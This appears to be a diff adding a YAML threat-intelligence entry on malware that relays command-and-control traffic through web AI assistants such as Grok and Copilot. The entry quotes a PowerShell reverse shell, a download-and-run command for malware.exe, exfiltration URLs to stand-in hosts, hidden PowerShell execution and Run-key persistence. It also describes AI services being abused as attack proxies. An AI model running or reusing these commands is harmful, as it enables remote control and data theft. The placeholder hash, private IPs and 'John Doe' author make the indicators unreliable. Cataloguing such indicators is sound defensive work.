@@ -1,0 +1,55 @@
+description: AI-driven malware uses AI assistants like Grok and Copilot as covert
+  command-and-control relays, fetching attacker-controlled URLs and returning responses.
+TTPs:
+  processes:
+  - WebView2
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - https://copilot.microsoft.com
+  - https://grok.com
+  - www.c2.com/?exfil_data=[user_data]
+  - powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Users\\Public\\Downloads\\script.ps1
+  powershell:
+  - <pre>Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\Users\\Public\\Downloads\\malware.exe; Start-Process C:\\Users\\Public\\Downloads\\malware.exe</pre>
+  - <code>$client = New-Object System.Net.Sockets.TcpClient("192.168.1.10", 443); $stream = $client.GetStream(); [byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes,0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);Invoke-Expression $data}</code>
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - WebView2->www.c2.com,80
+  - WebView2->www.c2.com,443
+  - powershell.exe, 192.168.10.5, 443
+  - cmd.exe, example.com, 80
+  file_activity:
+  - C:\\Users\\Public\\Downloads\\script.ps1
+  - C:\\Users\\Public\\Downloads\\malware.exe
+  persistence:
+  - Registry run key modification
+  process_relations: []
+IOCs:
+  hashes:
+  - SHA256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
+  ip_addresses:
+  - 192.168.1.10
+  - 192.168.10.5
+  domains:
+  - copilot.microsoft.com
+  - grok.com
+  - c2.com
+  - example.com
+  urls:
+  - https://copilot.microsoft.com
+  - https://grok.com/?breeds_data=DEFINATLY_NOT_ENCRYPTED_C2_EXFL.DATA.FROM_VICTIM.COMPROMISED.PC
+  - www.c2.com/?exfil_data=[user_data]
+  - http://example.com/malware.exe
+authors:
+- Check Point Research
+- John Doe
+malware_families:
+- TurkishRat
+reference: https://research.checkpoint.com/2026/ai-in-the-middle-turning-web-based-ai-services-into-c2-proxies-the-future-of-ai-driven-attacks/
+date_of_publication: February 17, 2026
+file_creation_date: February 21, 2026
